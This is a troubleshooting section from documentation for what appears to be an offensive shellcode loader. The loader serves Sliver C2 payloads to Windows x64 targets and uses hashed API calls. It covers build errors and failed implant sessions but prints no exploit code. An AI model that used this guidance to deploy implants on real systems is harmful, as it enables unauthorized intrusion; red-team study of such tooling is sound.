## 16. Troubleshooting

### "open bin/loader.x64.o: no such file or directory"

The COFF objects haven't been compiled yet. Run:
```bash
make loader
```

### "unsupported machine type 0x0000"

The file passed to `--shellcode` is not a Windows x64 COFF object. Check that the file you're passing is the output of `sliver generate --format shellcode`, not a PE executable.

### Build fails with "undefined reference to NtCreateThreadEx_t"

The `NTSTATUS` or `NTAPI` types are not being defined before the typedef. This should be handled by the `#ifndef NTSTATUS / typedef LONG NTSTATUS` guard in `loader.h`. If you're on an unusual MinGW version, verify:
```bash
echo '#include <windows.h>' | x86_64-w64-mingw32-gcc -x c -E - | grep NTSTATUS
```

### Sliver session never appears

1. Confirm the listener is running: `sliver > jobs`
2. Confirm the payload URL is reachable from the target machine
3. Confirm `palacekit serve` was still running when the shellcode executed (one-shot server dies after one download)
4. Check that `--format shellcode` was used (not `--format shared`)
5. Confirm the target is Windows x64 (shellcode will crash on x86 or ARM)

### gen-hashes output doesn't match services.c

This should not happen since the hash function is deterministic. If you modified `services.c` manually, re-run `gen-hashes` and update the `#define H_*` constants.

### "link: spec line ... merge: empty stack"

The `merge` directive appeared as a standalone line rather than as a modifier after `load`. Check that `merge` is correctly indented under the `load` line in the spec file.
